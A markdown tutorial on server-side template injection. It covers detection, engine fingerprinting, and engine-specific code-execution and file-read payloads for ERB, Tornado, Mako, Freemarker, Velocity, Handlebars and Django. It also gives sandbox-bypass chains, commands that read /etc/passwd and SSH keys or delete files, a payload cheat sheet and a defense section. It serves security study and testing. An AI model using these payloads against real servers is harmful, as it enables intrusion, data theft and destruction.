# Server-Side Template Injection (SSTI) 

## Table of Contents

1. [What Are Template Engines?](#1-what-are-template-engines)
2. [What is SSTI?](#2-what-is-ssti)
3. [How SSTI Vulnerabilities Arise](#3-how-ssti-vulnerabilities-arise)
4. [Detection — Two Contexts](#4-detection--two-contexts)
   - 4.1 [Plaintext Context](#41-plaintext-context)
   - 4.2 [Code Context](#42-code-context)
5. [Identification — Fingerprinting the Engine](#5-identification--fingerprinting-the-engine)
6. [Exploitation Methodology](#6-exploitation-methodology)
   - 6.1 [Read: Learn Syntax & Security Docs](#61-read-learn-syntax--security-docs)
   - 6.2 [Read: Look for Known Exploits](#62-read-look-for-known-exploits)
   - 6.3 [Explore: Map the Environment](#63-explore-map-the-environment)
   - 6.4 [Create: Object Chain Exploits](#64-create-object-chain-exploits)
   - 6.5 [Create: Developer-Supplied Object Exploits](#65-create-developer-supplied-object-exploits)
7. [Engine-Specific Exploitation](#7-engine-specific-exploitation)
   - 7.1 [ERB (Ruby)](#71-erb-ruby)
   - 7.2 [Tornado (Python)](#72-tornado-python)
   - 7.3 [Mako (Python)](#73-mako-python)
   - 7.4 [Freemarker (Java)](#74-freemarker-java)
   - 7.5 [Velocity (Java)](#75-velocity-java)
   - 7.6 [Handlebars (Node.js)](#76-handlebars-nodejs)
   - 7.7 [Django (Python)](#77-django-python)
8. [Sandbox Bypass Techniques](#8-sandbox-bypass-techniques)
9. [Impact Assessment](#9-impact-assessment)
10. [Defense & Prevention](#10-defense--prevention)
11. [Quick Reference Cheat Sheet](#11-quick-reference-cheat-sheet)

---

## 1. What Are Template Engines?

A template engine lets developers write HTML (or other output formats) with **placeholders** for dynamic data. At runtime, the engine combines a static template with variable data to generate the final output.

**How a safe template works:**

```
Template:  "Dear {{first_name}},"
Data:      { first_name: "Carlos" }
Output:    "Dear Carlos,"
```

The data flows into the template through a defined variable slot — it is treated as **data**, not as code. The engine never evaluates the value of `first_name` as template logic.

**Common template engines by language:**

| Language | Template Engines |
|----------|-----------------|
| Python | Jinja2, Mako, Tornado, Django |
| Java | Freemarker, Velocity, Thymeleaf, Pebble |
| Ruby | ERB, Haml, Slim |
| PHP | Twig, Smarty, Blade |
| Node.js | Handlebars, Pug (Jade), EJS, Nunjucks |

---

## 2. What is SSTI?

Server-Side Template Injection occurs when **user-controlled input is concatenated directly into a template string** rather than being passed in as a data variable. The template engine then evaluates the attacker's input as template code — not as a string literal.

The key distinction:

```python
# SAFE — user input passed as data (variable slot)
output = twig.render("Dear {{first_name}},", {"first_name": request.get("name")})
# The engine replaces {{first_name}} with the value — treats it as data

# VULNERABLE — user input concatenated into the template itself
output = twig.render("Dear " + request.get("name"))
# If name = "{{7*7}}", the engine sees the literal string "Dear {{7*7}}"
# and evaluates it, returning "Dear 49"
```

In the vulnerable version, the template engine cannot distinguish between the developer's template syntax and the attacker's injected syntax — because they are in the same string.

### Why SSTI is Severe

Template engines are designed to execute code. They have access to the application's runtime environment, internal objects, the filesystem, and often the operating system. Injecting into a template is not just injecting into a string — it is injecting into a **code execution environment**. This is why SSTI frequently leads directly to Remote Code Execution (RCE).

---

## 3. How SSTI Vulnerabilities Arise

### Pattern 1 — Accidental Concatenation

Developer builds a custom greeting or message by concatenating a user-supplied parameter directly into the template string. They think of it as string formatting, not realizing the template engine will actively evaluate whatever is inside the string.

```php
// PHP / Twig — VULNERABLE
$output = $twig->render("Dear " . $_GET['name']);
```

URL: `http://site.com/?name={{7*7}}` → Output: `Dear 49`

### Pattern 2 — Intentional User-Controlled Templates

Some applications deliberately give privileged users (content editors, admins) the ability to write or edit templates — for customizing emails, product descriptions, landing pages, etc. If an attacker can compromise such an account, or if access controls are weak, they have direct template code execution.

This is especially common in:
- CMS platforms with template editing features
- Email marketing platforms
- E-commerce product description editors

### Pattern 3 — Code Context Injection

User input is placed **inside** an existing template expression rather than around it. This is subtler and frequently missed.

```python
# Vulnerable code: user input placed inside {{ }}
engine.render("Hello {{" + greeting + "}}", data)
```

The URL: `?greeting=data.username` renders `Hello Carlos` — looks like a normal variable lookup. But injecting `?greeting=data.username}}{{7*7}}` would close the expression, add new template syntax, and reveal the injection.

---

## 4. Detection — Two Contexts

Detection strategy depends on which context the injection point falls into.

### 4.1 Plaintext Context

The user input is rendered directly as part of the template's output — like a message, greeting, or notification. This often looks identical to a reflected XSS point, which is why it gets mislabeled.

**Step 1 — Fuzz with template metacharacters:**

```
${{<%[%'"}}%\
```

If the server throws an exception or error → the input is being interpreted by a template engine. Errors from the engine (not a generic 500) often name the engine and version directly.

**Step 2 — Confirm with math evaluation:**

Use mathematical expressions that produce different results depending on the engine:

```
${7*7}      → 49   (ERB, Freemarker, EL)
{{7*7}}     → 49   (Jinja2, Twig)
{{7*'7'}}   → 49   (Twig) / 7777777 (Jinja2) ← key differentiator
<%= 7*7 %>  → 49   (ERB)
#{7*7}      → 49   (Ruby string interpolation)
```

If the response contains the **evaluated result** (49, 7777777, etc.) rather than the literal string — SSTI confirmed.

### 4.2 Code Context

The user input lands inside an existing template expression — typically as a variable name or attribute lookup. This context is much harder to spot because normal behavior looks like a legitimate object property access.

**Step 1 — Identify the parameter type:**

If a parameter like `?greeting=data.username` renders a username, you may be inside a template expression. Try injecting arbitrary HTML to first rule out simple XSS:

```
?greeting=data.username<b>test</b>
```

If the `<b>` tags appear **encoded or absent** (not rendered as bold), the input is inside a template expression — not directly in HTML output. XSS is not present, but SSTI may be.

**Step 2 — Try to break out of the expression:**

Inject a closing brace sequence followed by HTML:

```
?greeting=data.username}}<h1>test</h1>
```

Possible outcomes:
- **Error** — wrong closing syntax, but confirms expression context
- **Blank output** — wrong closing syntax, different engine
- **Rendered HTML** (`Hello Carlos<h1>test</h1>`) → you successfully closed the expression and injected into the plaintext context → SSTI confirmed

The closing syntax that works tells you which engine you're dealing with (`}}` = Jinja2/Twig, `}` = Freemarker, `%>` = ERB, etc.).

---

## 5. Identification — Fingerprinting the Engine

Once injection is confirmed, you need to know which engine you're in — because every engine has completely different exploitation syntax, APIs, and available objects.

### Method 1 — Read the Error Message

Submit obviously invalid syntax and read the stack trace:

```
<%=foobar%>   →  NameError: undefined local variable `foobar' for main (ERB/Ruby)
${foobar}     →  FreeMarker template error: foobar is not defined
{{foobar}}    →  UndefinedError: 'foobar' is undefined (Jinja2)
```

Stack traces often name the engine, the language, and the version — all of which directly inform your exploitation approach.

### Method 2 — Decision Tree Probing

Use payloads that produce different outputs in different engines to narrow down the possibilities:

```
{{7*7}}        → 49           → Twig or Jinja2
{{7*'7'}}      → 49           → Twig
{{7*'7'}}      → 7777777      → Jinja2
${7*7}         → 49           → Freemarker, Groovy, EL, ERB
<%= 7*7 %>     → 49           → ERB (Ruby)
#{7*7}         → 49           → Ruby string interpolation
*{7*7}         → 49           → Spring Expression Language (SpEL)
```

**Important:** The same payload can produce a `49` in multiple engines. Never fingerprint based on a single payload. Cross-reference two or more payloads, use error messages, and study what objects are available.

### Method 3 — Object/Namespace Inspection

Some engines expose a self-referential object that lists all available variables:

```
{{self}}               → Jinja2 (shows template object)
${T(java.lang.System).getenv()}   → Java engines (Freemarker, SpEL)
<%= ENV %>             → ERB (Ruby environment)
```

---

## 6. Exploitation Methodology

Once the engine is identified, exploitation follows a structured four-phase process: **Read → Read → Explore → Create**.

### 6.1 Read: Learn Syntax & Security Docs

The engine's official documentation is the primary exploitation resource. It tells you:
- How to embed code blocks (native code execution syntax)
- What built-in objects and functions exist
- Which functions are flagged as dangerous (security sections)

**What to look for in documentation:**

- **Code execution functions:** `system()`, `exec()`, `popen()`, `Runtime.getRuntime().exec()`
- **File read functions:** `File.open()`, `Dir.entries()`, `readAllBytes()`
- **Object introspection features:** `getClass()`, `getProtectionDomain()`, built-in type casting
- **Security warnings:** Any warning like "do not expose this to untrusted users" is a direct pointer to an exploitation primitive

Example — ERB documentation reveals:
```ruby
<%= Dir.entries('/') %>                      # list directory
<%= File.open('/etc/passwd').read %>         # read arbitrary file
<%= system("whoami") %>                      # execute OS command
```

### 6.2 Read: Look for Known Exploits

Once the engine is identified, search for documented SSTI exploits:
- Search `"<engine name>" SSTI exploit` or `"<engine name>" server-side template injection`
- Check HackTricks, PayloadsAllTheThings, PortSwigger Research, and security blogs
- Adapt public exploits to your target's specific version and environment

Known exploits exist for all major engines — most exploitation work in real assessments is adapting, not inventing from scratch.

### 6.3 Explore: Map the Environment

If documentation research hasn't yielded a direct exploit, enumerate everything available in the current template context.

**List environment variables (Java engines):**
```
${T(java.lang.System).getenv()}
```

**Probe variable names (Burp Intruder):**
Use Burp Intruder's built-in variable name wordlist to brute-force which variable names are defined in the template scope. Inject `{{varname}}` or `${varname}` with each candidate and observe which ones produce output vs. errors.

**Key distinction — built-in vs developer-supplied objects:**

- **Built-in objects** — come with the engine, are well-documented, often sandboxed
- **Developer-supplied objects** — exposed by the application itself (e.g., `user`, `product`, `order`) — almost never documented, often less hardened, may contain sensitive data or dangerous methods

Developer-supplied objects deserve the most focus. An app exposing a `user` object likely exposes methods like `user.setAvatar()`, `user.gdprDelete()`, etc. — methods that weren't designed to be invoked from template context and may allow filesystem access or data deletion.

### 6.4 Create: Object Chain Exploits

When no single built-in function gives you code execution, chain multiple objects and methods together to traverse from an innocuous starting object to a dangerous one.

**Concept:** Every object in Java (and most OO languages) has introspective methods that expose its class, its class loader, its protection domain — and through those, you can reach `Runtime`, file I/O, class instantiation, and more.

**Java/Freemarker sandbox escape via object chaining:**
```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

Chain breakdown:
```
product                          → a developer-supplied object (exposed by the app)
  .getClass()                    → java.lang.Class of product
  .getProtectionDomain()         → ProtectionDomain (security domain of the class)
  .getCodeSource()               → CodeSource (where the class was loaded from)
  .getLocation()                 → URL of the JAR/directory
  .toURI()                       → convert to URI
  .resolve('/home/carlos/...')   → resolve target file path against that URI
  .toURL()                       → convert back to URL
  .openStream()                  → open an InputStream to the file
  .readAllBytes()                → read all bytes
  ?join(" ")                     → Freemarker: join byte array with spaces (renders as decimal ASCII)
```

The output is decimal ASCII codes — convert to ASCII to read the file. This works even when the sandbox blocks direct `Runtime.exec()` because it only uses standard Java I/O classes.

**Velocity (Java) object chain for RCE:**
```
$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami")
```

The `ClassTool` (`$class`) is a Velocity built-in that allows inspecting and retrieving references to arbitrary Java classes — essentially a type-safe class loader accessible from template syntax.

### 6.5 Create: Developer-Supplied Object Exploits

When the engine is sandboxed and no built-in chain works, pivot to custom objects exposed by the application. These are almost always less battle-hardened than engine built-ins.

**Discovery approach:**
1. Enumerate all objects available in template scope (probe, check errors, check docs)
2. Trigger errors on unknown objects to discover methods — error messages often reveal function signatures
3. Read the application's source code if accessible (other SSTI payloads, LFI, etc.)
4. Chain developer methods to reach sensitive operations

**Example — custom `user` object exploitation:**

An application exposes a `user` object in templates. Errors reveal:
```
user.setAvatar(path, mimeType)   → sets the user's avatar to an arbitrary file path
user.gdprDelete()                → deletes the user's avatar
```

Exploitation chain:
```
Step 1: user.setAvatar('/etc/passwd', 'image/jpg')   → mounts /etc/passwd as avatar
Step 2: GET /avatar?avatar=attacker                  → downloads the "avatar" = /etc/passwd
Step 3: user.setAvatar('/home/carlos/.ssh/id_rsa', 'image/jpg')  → mount SSH key
Step 4: GET /avatar?avatar=attacker                  → read SSH private key
Step 5: user.gdprDelete()                            → delete a target user's file
```

The key insight: `setAvatar()` was designed to accept an uploaded image path — the developer never considered that an attacker could set it to any arbitrary filesystem path and then "download" the avatar to read the file.

---

## 7. Engine-Specific Exploitation

### 7.1 ERB (Ruby)

**Syntax:** `<%= expression %>` to evaluate and output, `<% code %>` to execute without output.

```ruby
# Detect
<%= 7*7 %>                                    → 49

# OS command execution
<%= system("whoami") %>                        → executes, output to stdout (may not appear)
<%= `whoami` %>                                → backtick returns output as string
<%= IO.popen('whoami').read %>                 → explicit pipe read

# File read
<%= File.open('/etc/passwd').read %>
<%= Dir.entries('/') %>                        → list directory

# Full RCE (delete file)
<%= system("rm /home/carlos/morale.txt") %>
```

**Detection signature:** Stack traces mention `erb.rb`, `NameError`, Ruby-style tracebacks.

---

### 7.2 Tornado (Python)

**Syntax:** `{{expression}}` for output, `{%statement%}` for logic/code blocks.

```python
# Detect
{{7*7}}                           → 49

# Break out from code context
user.name}}{{7*7}}                → closes expression, evaluates math, outputs result

# OS command execution
{% import os %}{{os.system('whoami')}}
{% import os %}{{os.popen('whoami').read()}}

# Full RCE
blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('id')}}
```

**Detection signature:** `tornado.template` in stack trace, Python tracebacks.

---

### 7.3 Mako (Python)

**Syntax:** `${expression}` for output, `<% code %>` for Python code blocks.

```python
# Detect
${7*7}                            → 49

# OS command execution (single payload — no multi-step needed)
<% import os
x = os.popen('id').read()
%>${x}

# Simplified
${__import__('os').popen('whoami').read()}
```

**Key feature:** Mako allows arbitrary Python `import` statements inside `<% %>` blocks — this often bypasses restrictions that block `os` in expression context.

---

### 7.4 Freemarker (Java)

**Syntax:** `${expression}` for output, `<#directive>` for logic, `?new()` for object instantiation.

```
# Detect
${7*7}                            → 49
${foobar}                         → error names Freemarker

# OS command execution via Execute class
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}

# Full RCE
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("rm /home/carlos/morale.txt")}

# File read via object chain (sandbox bypass)
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}

# Environment enumeration
${T(java.lang.System).getenv()}
```

**How `?new()` works:** Freemarker's `?new()` built-in creates a new instance of any Java class that implements `TemplateModel`. The `Execute` class in Freemarker's own utility package implements this interface and its constructor accepts a shell command — making it the canonical Freemarker RCE vector.

**Detection signature:** Freemarker error messages are verbose, include template name, and mention `freemarker.core`.

---

### 7.5 Velocity (Java)

**Syntax:** `$variable` for output, `#directive` for logic, `$class` for class introspection.

```
# Detect
${7*7}  or  #set($x = 7*7)${x}   → 49

# RCE via ClassTool
$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami")

# Alternative using method reference
#set($rt = $class.inspect("java.lang.Runtime").type)
#set($proc = $rt.getRuntime().exec("whoami"))
#set($is = $proc.getInputStream())
#set($reader = $class.inspect("java.io.InputStreamReader").type.asSubclass($class.inspect("java.io.Reader").type).newInstance($is))
#set($sc = $class.inspect("java.util.Scanner").type.newInstance($reader))
${sc.useDelimiter("\\A").next()}
```

---

### 7.6 Handlebars (Node.js)

**Syntax:** `{{expression}}` — but Handlebars is intentionally logic-less and sandboxed. Exploitation requires abusing the prototype chain via block helpers.

```javascript
// Detect
{{7*7}}                           → may return empty (Handlebars escapes math)
                                    or an error if expression helpers are invoked

// RCE via prototype chain traversal (documented exploit by @Zombiehelp54)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**How it works:** Handlebars blocks give access to string methods. By traversing `string.sub` → `constructor` (which is `Function`), you construct a new `Function` object with arbitrary JavaScript as its body. Calling it with `apply` executes the JavaScript — effectively bypassing Handlebars' sandbox entirely.

**Detection signature:** Errors from Handlebars are distinctive, mentioning `helpers`, `partials`, or showing `[object Object]` when traversal succeeds partially. Invalid syntax often causes the template to render empty rather than returning an error.

---

### 7.7 Django (Python)

**Syntax:** `{{variable}}` for output, `{% tag %}` for logic. Django templates are intentionally restrictive — no arbitrary code execution by design.

```python
# Detect
{{7*7}}                           → likely returns literal {{7*7}} or an error
                                    (Django doesn't evaluate math in templates)

# Information disclosure via debug tag
{% debug %}                       → dumps all template variables, context, and settings objects

# Secret key extraction
{{settings.SECRET_KEY}}           → Django's secret key (used for session signing, CSRF tokens)
```

**Why Django SSTI is different:**

Django's template engine is deliberately logic-less — it won't evaluate arbitrary Python expressions. However, if a developer has added **custom template tags** or exposed dangerous objects (like `settings`) to the template context, sensitive data can still be accessed. The `SECRET_KEY` is particularly valuable because:
- It signs session cookies → if known, forge any session → admin access
- It signs CSRF tokens → forge requests
- It's used in Django's password reset tokens → hijack any account

**Detection signature:** The `{% debug %}` tag is a Django-specific built-in. Error pages often show Django's yellow debug page with full stack traces and settings.

---

## 8. Sandbox Bypass Techniques

Many production deployments run templates in a sandbox — restricted environments where dangerous classes, functions, or modules are blocked. Sandboxes are hard to implement correctly and are frequently bypassable.

### Technique 1 — Object Chain to Java I/O (Freemarker/Velocity)

Bypass `Runtime.exec()` blocks by reaching the filesystem through standard Java I/O chains that aren't typically blocked:

```
product.getClass()                → any object exposes its class
  .getProtectionDomain()          → every class has a protection domain
  .getCodeSource()                → code source has a location URL
  .getLocation()                  → URL object (points to JAR/dir)
  .toURI().resolve('/target')     → resolve arbitrary path
  .toURL().openStream()           → open InputStream to file
  .readAllBytes()                 → read
```

This chain never directly calls `Runtime`, `ProcessBuilder`, or any flagged class — it only uses standard `java.io` and `java.net` classes that sandboxes often overlook.

### Technique 2 — Repurposing Developer-Supplied Objects

Developer objects are added to the template context by the application, not the engine — so the engine's sandbox doesn't apply to them. Any dangerous method on a developer object is a sandbox escape.

### Technique 3 — `__class__` / `__mro__` Chain (Python)

In Python template engines, if you can access any object, you can traverse the class hierarchy to reach `object` and from there find any subclass that exists in the runtime:

```python
# Jinja2 — walk MRO to find subprocess.Popen or similar
{{"".__class__.__mro__[1].__subclasses__()}}
# Returns a list of every subclass of 'object' currently loaded

# Find index of <class 'subprocess.Popen'> in that list, e.g. index 258
{{"".__class__.__mro__[1].__subclasses__()[258]("whoami", shell=True, stdout=-1).communicate()}}
```

The index varies by Python version and loaded modules — probe the list output to find the right class.

### Technique 4 — Hybrid DTD / Local DTD (Freemarker)

If an external network is blocked but a local DTD exists, Freemarker's `?new()` can be used with any `TemplateModel` subclass available on the classpath — not just the built-in `Execute`. Enumerate available classes by attempting instantiation and reading error messages.

### Technique 5 — Prototype Pollution (Handlebars/JavaScript)

Handlebars' block helper system allows traversal of the prototype chain — reaching `Function` constructor from any string method, effectively turning any string helper into arbitrary JS execution (as shown in Section 7.6).

---

## 9. Impact Assessment

| Scenario | Impact |
|----------|--------|
| Unsandboxed engine, RCE available | Full server compromise — read/write files, execute commands, reverse shell |
| Sandboxed engine, file read available | Read source code, config files, credentials, private keys |
| Django template, settings exposed | `SECRET_KEY` → forge sessions, hijack any account |
| Developer-supplied object exploitation | Arbitrary file read/delete, data exfiltration, account manipulation |
| Information disclosure only | Internal paths, object structures, framework version → assists further attacks |

### Escalation Path

```
SSTI
 │
 ├── RCE → whoami → read /etc/passwd, /etc/shadow
 │       → read app config → DB credentials → dump database
 │       → read ~/.ssh/id_rsa → persistent SSH access
 │       → reverse shell → full interactive access
 │       → pivot to internal network
 │
 ├── File Read (no RCE) → read source code → find hardcoded credentials
 │                      → read config files → find API keys, DB passwords
 │                      → read SSH keys, certificates
 │
 └── Info Disclosure → SECRET_KEY → forge sessions
                     → debug output → internal structure, object map
                     → version info → known CVEs
```

---

## 10. Defense & Prevention

### Rule 1 — Never Concatenate User Input into Templates

The root cause is always user input being treated as template code. The fix is architectural: always pass user input as **data variables**, never as part of the template string itself.

```python
# VULNERABLE
output = template_engine.render("Hello " + user_input)

# SAFE
output = template_engine.render("Hello {{name}}", {"name": user_input})
```

This is the only complete fix. All other defenses are mitigations.

### Rule 2 — Use Logic-Less Template Engines

Logic-less engines like **Mustache** only support variable substitution — they have no code execution capability. By design, even if user input enters the template, there is no execution context to exploit.

Engines to prefer for user-facing content where input might be involved:
- Mustache (available for most languages)
- Handlebars with strict mode (though as shown in Section 7.6, still exploitable in some contexts)

Engines to be very cautious with when user input is nearby:
- Jinja2, Mako, Tornado, ERB, Freemarker, Velocity — all have powerful code execution features

### Rule 3 — Sandbox Execution Environments

If user-submitted templates are a business requirement, run the template engine in a sandbox:
- Remove access to dangerous classes and modules at the engine level
- Run the template renderer in a separate process with limited OS permissions (dedicated low-privilege service account)
- Deploy the template renderer inside a locked-down container (Docker with minimal capabilities, read-only filesystem, no network access)

Accept that sandboxes can be bypassed and add defense-in-depth (monitoring, egress filtering, least privilege).

### Rule 4 — Strict Input Validation for Template Contexts

If user input must influence template rendering, validate it strictly against an allowlist:
- Only accept known-safe variable names (e.g., `user.name`, `user.first_name`)
- Reject any input containing template syntax characters: `{{`, `}}`, `<%`, `%>`, `${`, `#`, `{%`

This is a blacklist/allowlist approach and can be bypassed — use as a supplementary control, not a primary defense.

### Rule 5 — Least Privilege for the Template Process

Even if SSTI leads to RCE, the blast radius depends on what the server process can access:
- Run the web application as a dedicated low-privilege user
- Restrict filesystem access (only the web root, no access to `/home/`, `/etc/shadow`, SSH keys)
- Block outbound network connections from the web server process
- Use OS-level mandatory access controls (AppArmor, SELinux)

---

## 11. Quick Reference Cheat Sheet

### Detection Payloads

```
${{<%[%'"}}%\          → fuzzing string — triggers errors in most engines
{{7*7}}                → 49 in Jinja2, Twig (Handlebars may return empty)
${7*7}                 → 49 in Freemarker, Mako, ERB
<%= 7*7 %>             → 49 in ERB
{{7*'7'}}              → 49 (Twig) or 7777777 (Jinja2)
#{7*7}                 → 49 in Ruby interpolation
*{7*7}                 → 49 in Spring EL
```

### Engine Fingerprinting by Syntax

| Payload | Result | Engine |
|---------|--------|--------|
| `{{7*7}}` | 49 | Jinja2 or Twig |
| `{{7*'7'}}` | 49 | Twig |
| `{{7*'7'}}` | 7777777 | Jinja2 |
| `${7*7}` | 49 | Freemarker, Mako, Groovy, ERB |
| `<%= 7*7 %>` | 49 | ERB (Ruby) |
| `#{7*7}` | 49 | Ruby interpolation |
| Error mentions `NameError`, `erb.rb` | — | ERB |
| Error mentions `FreeMarker` | — | Freemarker |
| Error mentions `Jinja2` or `UndefinedError` | — | Jinja2 |
| Error mentions `tornado.template` | — | Tornado |
| `{% debug %}` works | — | Django |

### RCE Payloads by Engine

```ruby
# ERB (Ruby)
<%= system("whoami") %>
<%= `id` %>
<%= IO.popen('id').read %>

# Tornado / Jinja2 (Python)
{% import os %}{{os.popen('id').read()}}
{{__import__('os').popen('id').read()}}

# Mako (Python)
<% import os; x=os.popen('id').read() %>${x}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Velocity (Java)
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
```

### File Read Payloads

```ruby
# ERB
<%= File.open('/etc/passwd').read %>

# Python (Jinja2/Tornado/Mako)
{{open('/etc/passwd').read()}}
{% import builtins %}{{builtins.open('/etc/passwd').read()}}

# Freemarker (Java — sandbox-safe chain)
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}

# Django (info disclosure)
{% debug %}
{{settings.SECRET_KEY}}
```

### Injection Points to Test

| Location | Why It's Risky |
|----------|---------------|
| URL parameters in message/greeting endpoints | Direct template rendering |
| Profile/display name fields | Rendered in templates on other pages |
| Product description editors (admin panels) | Intentional template editing |
| Email subject/body fields | Passed to template engine for formatting |
| Error message customization | Often rendered directly into templates |
| Search query echo | Search term reflected inside template |
| Cookie values | Sometimes passed into template context |